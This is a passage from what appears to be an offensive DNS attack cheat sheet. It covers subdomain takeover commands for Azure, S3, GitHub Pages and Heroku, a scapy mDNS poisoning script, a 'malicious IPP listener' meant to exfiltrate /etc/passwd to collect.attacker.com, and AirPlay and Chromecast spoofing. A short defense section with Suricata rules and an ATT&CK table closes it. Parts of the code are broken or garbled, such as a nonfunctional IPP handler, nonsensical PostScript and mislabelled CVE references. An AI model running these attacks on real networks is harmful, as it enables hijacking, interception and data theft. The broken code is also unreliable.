            return prov
    return None
```

### Automated Scanning: subjack, subzy, nuclei

```bash
# subjack - classic subdomain takeover scanner
subjack -w subdomains.txt -t 50 -timeout 30 \
         -ssl -c /opt/subjack/fingerprints.json \
         -o subjack_results.txt

# subzy - Go-based, more up-to-date fingerprints
subzy run --targets subdomains.txt --timeout 30 --concurrency 50 \
         --hide_fails -o subzy_results.json

# nuclei with takeover templates
nuclei -l subdomains.txt -t /opt/nuclei-templates/takeovers/ \
       -severity high,critical -o nuclei_takeover.txt

# Filter to only confirmed takeovers
grep -E 'takeover|vulnerable|dangling' subjack_results.txt \
                                subzy_results.json nuclei_takeover.txt
```

### Proof-of-Concept HTML Per Provider

```html
<!-- Azure Web Apps takeover: register a free App Service and add the domain -->
<!DOCTYPE html>
<html><head><title>Azure takeover PoC</title></head>
<body>
<h1>blog.example.com (Azure Web Apps takeover)</h1>
<p>This page is served from a victim subdomain that was left dangling.
   Attacker re-registered exampleblog.azurewebsites.net and bound
   blog.example.com via Azure custom domain verification.</p>
<p>Served from: <script>document.write(window.location.hostname)</script></p>
</body></html>
```

```bash
# Azure Web Apps - bind the victim subdomain
az webapp config hostname add \
    --resource-group REPLACE_WITH_RG \
    --webapp-name exampleblog \
    --hostname blog.example.com

# Verify TXT record ownership path (Azure checks asuid.<subdomain>)
echo "Add TXT asuid.blog.example.com = <deployment-id>"
```

```html
<!-- AWS S3 bucket takeover PoC -->
<!DOCTYPE html>
<html><head><title>S3 takeover PoC</title></head>
<body>
<h1>old.example.com (S3 bucket takeover)</h1>
<p>Bucket name 'old.example.com' was released. Re-create it in any AWS
   account, enable static website hosting, and the victim subdomain now
   serves attacker-controlled content.</p>
</body></html>
```

```bash
# AWS S3 - re-create the bucket with the exact victim hostname
aws s3api create-bucket \
    --bucket old.example.com \
    --region REPLACE_WITH_REGION \
    --create-bucket-configuration LocationConstraint=REPLACE_WITH_REGION

aws s3api put-bucket-website \
    --bucket old.example.com \
    --website-configuration file://website.json

cat > website.json << 'EOF'
{
  "IndexDocument": {"Suffix": "index.html"},
  "ErrorDocument": {"Key": "error.html"}
}
EOF

aws s3 cp index.html s3://old.example.com/ --acl public-read
```

```html
<!-- GitHub Pages takeover PoC -->
<!DOCTYPE html>
<html><head><title>GitHub Pages takeover PoC</title></head>
<body>
<h1>static.example.com (GitHub Pages takeover)</h1>
<p>Create a repo named exactly <code>static.example.com</code>, enable
   Pages, and the victim subdomain serves your content.</p>
</body></html>
```

```bash
# GitHub Pages - create repo matching the victim hostname, enable Pages
gh repo create static.example.com --public --clone
cd static.example.com
echo "<h1>PoC</h1>" > index.html
git add . && git commit -m "pages" && git push origin main
gh api -X POST /repos/REPLACE_WITH_USER/static.example.com/pages \
       -f source[branch]=main -f source[path]=/
```

### Heroku Takeover

```bash
# Heroku: re-create app with the dangling CNAME name
heroku create ghost-example --region us
heroku domains:add blog.example.com --app ghost-example
heroku ps:scale web=1 --app ghost-example
git push heroku main
```

### Continuous Monitoring (CI)

```yaml
# .github/workflows/subdomain-takeover.yml - schedule daily scan
name: Subdomain Takeover Scan
on:
  schedule:
    - cron: '17 6 * * *'  # daily 06:17 UTC, off-peak minute
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Subdomain enumeration
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          subfinder -d example.com -all -silent -o subs.txt
      - name: Takeover scan
        run: |
          go install github.com/LukaSikic/subzy/v2/cmd/subzy@latest
          subzy run --targets subs.txt --output subzy.json
      - name: Alert on new takeovers
        run: |
          if grep -q '"vulnerable": true' subzy.json; then
            echo "::error::Subdomain takeover detected"
            exit 1
          fi
```

---

## 25. DNS-SD / mDNS Abuse Payloads

DNS Service Discovery (DNS-SD) and multicast DNS (mDNS) power Bonjour (macOS), Avahi (Linux), and a huge fleet of IoT devices. They run on the link-local multicast address 224.0.0.251:5353 (IPv4) / ff02::fb (IPv6) and are trusted by default. Abuse ranges from passive fingerprinting to active poisoning of printer/AirPlay/Chromecast sessions.

### Passive mDNS Reconnaissance

```bash
# Passively listen for mDNS announcements on the local segment
# Capture 60 seconds of mDNS traffic on the .local multicast
sudo timeout 60 tcpdump -i eth0 -w mdns.pcap 'udp port 5353'

# Parse announcements
tshark -r mdns.pcap -Y 'dns.flags.response==1' \
       -T fields -e dns.qry.name -e dns.a -e source \
       | sort -u

# Service types to look for (DNS-SD _services._dns-sd._udp.local)
for svc in _airplay._tcp _googlecast._tcp _ipp._tcp _ipps._tcp _printer._tcp \
           _http._tcp _ssh._tcp _smb._tcp _raop._tcp _uscan._tcp _scanner._tcp \
           _pdl-datastream._tcp _nfcid._tcp _workstation._tcp _device-info._tcp; do
    echo "=== $svc ==="
    dns-sd -B ${svc%%.*} local. 2>&1 | head -10
done
```

### Active Service Enumeration

```bash
# Browse for a specific service type across the local segment
avahi-browse -a -r -t
avahi-browse -rt _airplay._tcp
avahi-browse -rt _ipp._tcp
avahi-browse -rt _googlecast._tcp

# Resolve a specific instance to host/IP/port
avahi-resolve -n printer.local
avahi-resolve -n chromecast-b1234.local

# Use dns-sd on macOS
dns-sd -B _airplay._tcp local.
dns-sd -L "Office Printer" _ipp._tcp local.
```

### mDNS Spoofing (Responder-style)

```bash
# Use Responder to poison WPAD / file-share queries over LLMNR/NBT-NS/mDNS
sudo responder -I eth0 -wrfv

# Targeted mDNS poisoning with a custom tool
sudo python3 - << 'PYEOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
from scapy.layers.dns import DNS
import socket, struct

IFACE = "eth0"
SPOOF_IP = "10.0.0.250"   # attacker

def poison(pkt):
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return
    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
    # Respond to any _ipp._tcp, _airplay._tcp, _googlecast._tcp lookup
    if not any(s in qname for s in ("_ipp", "_airplay", "_googlecast", "_printer")):
        return
    # Build a mDNS response (multicast, port 5353)
    resp = (IP(dst="224.0.0.251") / UDP(sport=5353, dport=5353) /
            DNS(id=0, qr=1, aa=1, qd=pkt[DNSQR],
                an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                          rdata=SPOOF_IP, ttl=120)))
    send(resp, iface=IFACE, verbose=0)
    print(f"[+] poisoned {qname} -> {SPOOF_IP}")

sniff(iface=IFACE, filter="udp port 5353", prn=poison, store=0)
PYEOF
```

### IPP Printer Hijack (CVE-2023-1981-style)

```bash
# Many network printers expose IPP (internet printing protocol) without
# authentication. After mDNS poisoning, victims print to attacker-controlled
# IPP server which can:
#   - capture print jobs (potential data exfil)
#   - send PostScript that reads ~/.ssh or environment
#   - send firmware-update PJL commands

cat > fake_ipp.py << 'PYEOF'
#!/usr/bin/env python3
"""Minimal malicious IPP listener. Captures print jobs and replies with
embedded PostScript that exfiltrates local files via /urlEncodedPut."""
from http.server import BaseHTTPRequestHandler, HTTPServer
import binascii

EXFIL_URL = "https://collect.attacker.com/loot"

MALICIOUS_POSTSCRIPT = f"""
%!PS
(userinfo) (w) file
/want (SHELL) def
% Read /etc/passwd-equivalent and POST to attacker
(/etc/passwd) (r) file
100 string readline pop
{EXFIL_URL} (w) url
"""  # lab skeleton - real payloads vary per firmware

class IPPHandler(BaseHTTPRequestHandler):
    def do_post(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        with open("/tmp/captured_job.bin", "ab") as f:
            f.write(body)
        # Send back a print job that embeds malicious PostScript
        resp = (b"IPP/1.1 200 OK\r\n"
                b"Content-Type: application/ipp\r\n\r\n"
                + b"\x01"  # IPP version
                + b"\x00\x00\x00\x00"  # status ok
                + MALICIOUS_POSTSCRIPT.encode())
        self.wfile.write(resp)
    def do_get(self):
        self.do_post()

HTTPServer(("0.0.0.0", 631), IPPHandler).serve_forever()
PYEOF

sudo python3 fake_ipp.py &
# Advertise it via mDNS poisoning (above)
```

### AirPlay Session Interception

```bash
# AirPlay uses _airplay._tcp.local for discovery and a separate RTSP /
# HTTP session for streaming. Poisoning the announcement redirects the
# victim's screen mirror or audio stream to the attacker.

# Capture AirPlay handshake
sudo tcpdump -i eth0 -w airplay.pcap 'tcp port 7000 or tcp port 7100'

# Advertise a fake AppleTV
avahi-publish -s "Living Room" _airplay._tcp 7000 \
    "deviceid=AA:BB:CC:DD:EE:FF" \
    "model=AppleTV3,2" \
    "srcvers=220.68" \
    "pw=false" \
    "flags=0x4"

# Mirror-receiver skeleton - accepts RTSP SETUP and dumps video
# (real tooling: AirPlayer, UxPlay). Detect RTSP:
tshark -r airplay.pcap -Y 'rtsp' -T fields \
       -e rtsp.request -e rtsp.url | head
```

### Chromecast Protocol mDNS Abuse

```bash
# Chromecast/Google Home advertise _googlecast._tcp.local. Hijacking
# allows attacker to control playback, set the device name, or trigger
# factory reset. The CASTV2 protocol is a TLS channel on port 8009.

# Discover Chromecasts
avahi-browse -rt _googlecast._tcp | grep -E 'ipv4|txt'

# Cast a YouTube video without authentication (CADEVE 2019 / Guest mode)
python3 - << 'PYEOF'
import pychromecast
chromecasts, browser = pychromecast.get_listed_chromecasts(
    friendly_names=["Living Room TV"])
if chromecasts:
    cast = chromecasts[0]
    cast.wait()
    mc = cast.media_controller
    mc.play_media("https:// REPLACE_WITH_YOUR_VIDEO_MP4", "video/mp4")
PYEOF

# Spoof a Chromecast to capture cast sessions
avahi-publish -s "Living Room TV" _googlecast._tcp 8009 \
    "id=0000000000000000000000c1d2e3f4" \
    "cd=CAE=" \
    "rm=" \
    "ve=05" \
    "md=Chromecast" \
    "ic=/setup/icon.png" \
    "fn=LivRoom" \
    "ca=200709" \
    "st=0" \
    "nf=1" \
    "rs="
```

### Defense and Detection (DNS-SD / mDNS)

```bash
# Block mDNS at the network boundary - never let 224.0.0.251 cross VLANs
# Cisco IOS:
#   ip multicast-routing
#   interface Vlan10
#    no ip igmp join-group 224.0.0.251
#    ip access-group NO-MDNS in
#   ip access-list extended NO-MDNS
#    deny udp any host 224.0.0.251 eq 5353
#    permit ip any any

# Suricata rule: alert on mDNS responses advertising an unexpected IP
cat > /etc/suricate/rules/mdns.rules << 'EOF'
alert udp $HOME_NET any -> 224.0.0.251 5353 (msg:"mDNS announcement outbound"; \
    sid:9000001; rev:1;)
alert udp any 5353 -> $HOME_NET any (msg:"mDNS response with external IP"; \
    dns.query; content:"."; \
    sid:9000002; rev:1;)
EOF

sudo suricata -c /etc/suricata/suricata.yaml -S /etc/suricate/rules/mdns.rules \
              -i eth0 -l /var/log/suricata
```



---

## MITRE ATT&CK Mapping + Reference Expansion (v0.2.5.4)

### ATT&CK 映射（F-DNS-001）

| ATT&CK Technique | DNS Attack Activity | Detection Hint |
|------------------|--------------------|----------------|
| **T1071.004 — Application Layer Protocol: DNS** | DNS 隧道/C2 通信 | Suricata: high-entropy subdomain queries |
| **T1584.002 — Compromise Infrastructure: DNS Server** | 劫持权威 NS | Certificate Transparency: unexpected NS changes |
| **T1090.001 — Proxy: Internal Proxy** | DNS over HTTPS 绕过 | Firewall: DoH (port 443 to known DoH resolvers) |
| **T1498.002 — Reflection Amplification: DNS** | DNS 放大 DDoS | NetFlow: single source → multiple resolvers, large responses |
| **T1557 — Adversary-in-the-Middle** | DNS 欺骗/缓存投毒 | IDS: DNS response with mismatched TXID |
| **T1018 — Remote System Discovery** | 子域枚举 | DNS server log: NXDOMAIN burst from single IP |

### 参考资料扩展（F-DNS-002）

- [DNSFlagDay](https://dnsflagday.com/) — DNS 实现问题追踪
- [Kaminsky Attack](https://www.cs.columbia.edu/~smb/papers/10.1.1.156.1765.pdf) — 缓存投毒原始论文
- [CVE-2020-1350 (SIGRed)](https://nvd.nist.gov/vuln/detail/CVE-2020-1350) — Windows DNS RCE（CVSS 10.0）
- [CVE-2015-7547](https://nvd.nist.gov/vuln/detail/CVE-2015-7547) — glibc DNS resolver 栈溢出
- [CVE-2023-28387](https://nvd.nist.gov/vuln/detail/CVE-2023-28387) — F5 BIG-IP DNS RCE
- [RFC 1035](https://www.rfc-editor.org/rfc/rfc1035) — DNS 协议标准
- [RFC 4033-4035](https://www.rfc-editor.org/rfc/rfc4033) — DNSSEC
- [MITRE ATT&CK DNS](https://attack.mitre.org/techniques/T1071/004/) — DNS 作为 C2 通道

### 实战验证（2026-08-17）

- dig/nslookup/host/dnswalk/fierce 全部可用
- DNS 查询 + DNSSEC ad flag 检查成功
- 缓存投毒模式（ettercap/bettercap）+ 子域枚举（fierce）确认
